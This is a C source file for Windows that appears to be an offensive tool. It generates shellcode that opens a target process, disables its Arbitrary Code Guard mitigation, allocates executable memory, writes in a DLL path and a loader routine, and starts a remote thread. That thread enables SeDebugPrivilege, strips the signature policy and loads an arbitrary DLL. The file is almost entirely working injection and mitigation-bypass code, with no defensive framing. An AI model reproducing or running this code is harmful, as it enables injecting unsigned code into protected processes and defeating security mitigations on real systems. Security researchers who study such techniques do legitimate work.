#define _CRT_SECURE_NO_WARNINGS

#include <intrin.h>
#include <stdio.h>

#include "InjectShellcode.h"

#pragma optimize("", off)

PSHELLCODE_PARAMS GetParams();
PVOID FindMyBase(PSHELLCODE_PARAMS pParams);
struct _TEB* CurrentTeb(VOID);
void* _memset(void *ptr, int c, size_t n);
size_t _wcslen(const wchar_t* str);
VOID _RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);
__declspec(noinline) DWORD WINAPI LoadLibraryThreadFunc(LoadLibraryThread *Pointers);

// Overwrites DllMain (technically CRT DllMain)
BOOL APIENTRY Shellcode(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    BOOLEAN ignored = 0;
    HANDLE hTarget = NULL;
    ULONG bytesWritten = 0;
    HANDLE hThread = NULL;
    OBJECT_ATTRIBUTES objAttr = { 0, };
    PSHELLCODE_PARAMS pParams = GetParams();
    CLIENT_ID Cid = { (HANDLE)(ULONG_PTR)pParams->dwPid, NULL };

	LoadLibraryThread Pointers;
    SIZE_T DllPathSize = (_wcslen(pParams->dllName) + 1) * sizeof(WCHAR);
	PROCESS_MITIGATION Policy = {ProcessDynamicCodePolicy, 0};

	_memset(&Pointers, 0, sizeof(Pointers));

	Pointers.LoadLibraryW = pParams->pLoadLibraryW;
	Pointers.GetLastError = pParams->pGetLastError;
	Pointers.NtSetInformationProcess = pParams->pNtSetInformationProcess;
	Pointers.RtlAdjustPrivilege = pParams->pRtlAdjustPrivilege;

    // Enable SeDebugPrivilege
    //if (0 != pParams->pRtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &ignored))
    //{
    //    int x = 1;
    //    __debugbreak();
    //}

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    pParams->pNtOpenProcess(&hTarget, PROCESS_ALL_ACCESS | PROCESS_SET_INFORMATION, &objAttr, &Cid);
    if (NULL == hTarget)
    {
        int x = 1;
		goto terminate;
    }

	// Disable ACG in target process 
	// ProcessMitigationPolicy = 52;
    if (!NT_SUCCESS(pParams->pNtSetInformationProcess(hTarget, (PROCESSINFOCLASS)52, &Policy, sizeof(Policy))))
    {
        int x = 2;
		goto terminate;
    }

    SIZE_T TestSize = 0x1000;
	pParams->pNtAllocateVirtualMemory(hTarget, &Pointers.DllPath, 0, &TestSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (NULL == Pointers.DllPath)
    {
        int x = 3;
		goto terminate;
    }

    if (!NT_SUCCESS(pParams->pNtWriteVirtualMemory(hTarget, Pointers.DllPath, pParams->dllName, (DWORD)DllPathSize, &bytesWritten)))
    {
        int x = 4;
		goto terminate;
    }

	PVOID PointersAddress = (PBYTE)Pointers.DllPath + bytesWritten;

    if (!NT_SUCCESS(pParams->pNtWriteVirtualMemory(hTarget, PointersAddress, &Pointers, sizeof(Pointers), &bytesWritten)))
    {
        int x = 5;
		goto terminate;
    }

	PVOID RemoteFuncAddress = (PBYTE)PointersAddress + bytesWritten;

    if (!NT_SUCCESS(pParams->pNtWriteVirtualMemory(hTarget, RemoteFuncAddress, (PBYTE)(&LoadLibraryThreadFunc), 0x100, &bytesWritten)))
    {
        int x = 6;
		goto terminate;
    }

    if (!NT_SUCCESS(pParams->pRtlCreateUserThread(hTarget, NULL, FALSE, 0, NULL, NULL, (PUCHAR)RemoteFuncAddress, PointersAddress, &hThread, NULL)))
    {
        int x = 7;
		goto terminate;
    }

	LARGE_INTEGER timeout;
	timeout.QuadPart = -20000000LL;
    if (!NT_SUCCESS(pParams->pNtWaitForSingleObject(hThread, FALSE, &timeout)))
    {
        int x = 8;
    }

terminate:
    // Don't trigger WER
    (void)pParams->pNtTerminateProcess(NtCurrentProcess(), 0);

    return TRUE;
}

__declspec(safebuffers) DWORD WINAPI LoadLibraryThreadFunc(LoadLibraryThread *Pointers)
{
	BOOLEAN Enabled;
	HMODULE ModuleHandle;
	PROCESS_MITIGATION Policy = {ProcessSignaturePolicy, 0};

	Pointers->RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &Enabled);

	Pointers->NtSetInformationProcess(((HANDLE)-1), (PROCESSINFOCLASS)52, &Policy, sizeof(Policy));

	ModuleHandle = (HMODULE)Pointers->LoadLibraryW(Pointers->DllPath);

	if (ModuleHandle == NULL)
		return (DWORD)Pointers->GetLastError();

	return 0;
}

struct _TEB* CurrentTeb( VOID )
{
    return (struct _TEB*)__readgsqword(FIELD_OFFSET(NT_TIB, Self));
}

PVOID WhereAmI()
{
    return _ReturnAddress();
}

void* _memset(void *ptr, int c, size_t n)
{
    unsigned char *p = (unsigned char *)ptr;

    while (n--)
        *p++ = (unsigned char)c;

    return ptr;
}

size_t _wcslen(const wchar_t* str) 
{
    size_t i = 0;

    while (*str)
    {
        str++;
        i++;
    }

    return i;
}

VOID _RtlInitUnicodeString(
    PUNICODE_STRING         DestinationString,
    PCWSTR SourceString
)
{
    DestinationString->Buffer = (PWSTR)SourceString;
    DestinationString->Length = (USHORT)_wcslen(SourceString) * sizeof(wchar_t);
    DestinationString->MaximumLength = DestinationString->Length;
}

BOOLEAN memeq(PUCHAR a, PUCHAR b, DWORD len)
{
    for (DWORD i = 0; i < len; i++)
    {
        if (a[i] != b[i])
        {
            return FALSE;
        }
    }
    return TRUE;
}

PVOID FindMyBase(PSHELLCODE_PARAMS pParams)
{
    PUCHAR pSearch = (PUCHAR)WhereAmI();

    for (;; pSearch--)
    {
        if (memeq(pSearch, pParams->magicNops, sizeof(pParams->magicNops)))
        {
            return pSearch;
        }
    }

    return NULL;
}

PSHELLCODE_PARAMS GetParams()
{
    PUCHAR pSearch = (PUCHAR)WhereAmI();
    
    for (;;pSearch++)
    {
        PSHELLCODE_PARAMS pCandidate = (PSHELLCODE_PARAMS)pSearch;

        if ((MAGIC1 == pCandidate->magic1) && (MAGIC2 == pCandidate->magic2))
        {
            return pCandidate;
        }
    }

    return NULL;
}

BOOL EndShellcode()
{
    return TRUE;
}

#include <PathCch.h>

int main()
{
    WCHAR myPath[MAX_PATH] = { 0, };
    HMODULE hMe = GetModuleHandle(NULL);
    PUCHAR shellcodeStart = (PUCHAR)GetProcAddress(hMe, "Shellcode");
    PUCHAR shellcodeEnd = (PUCHAR)GetProcAddress(hMe, "EndShellcode");
    const SIZE_T shellcodeLength = (DWORD)(ULONG_PTR)(shellcodeEnd - shellcodeStart);
    HMODULE hFile = NULL;
    DWORD bytesWritten = 0;

    GetModuleFileNameW(NULL, myPath, ARRAYSIZE(myPath));
    wcsncat(myPath, L".shellcode", ARRAYSIZE(myPath) - wcslen(myPath));

    hFile = CreateFileW(myPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        printf(" [!] Failed to open output file: %ws\n", myPath);
        return 1;
    }
    if (!WriteFile(hFile, shellcodeStart, (DWORD)shellcodeLength, &bytesWritten, NULL) ||
        (bytesWritten != shellcodeLength))
    {
        printf(" [!] Failed to write shellcode with GLE %u\n", GetLastError());
        return 1;
    }

    printf(" [+] Shellcode written to output file: %ws\n", myPath);

    return 0;
}
